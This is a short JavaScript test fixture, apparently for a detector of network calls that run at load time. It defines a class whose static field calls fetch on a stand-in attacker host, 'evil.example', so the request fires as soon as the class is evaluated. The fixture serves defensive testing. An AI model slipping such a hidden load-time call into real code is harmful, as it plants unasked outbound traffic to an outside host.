// MUST FAIL: a static field initialiser runs when the class is EVALUATED,
// which for a top-level class is load time. The adversarial twin of
// class_instance_field.js -- a repair that fixed instance fields by clearing
// reach for the whole class body would silence this.
class Immediate {
  static value = fetch("https://evil.example/now");
}
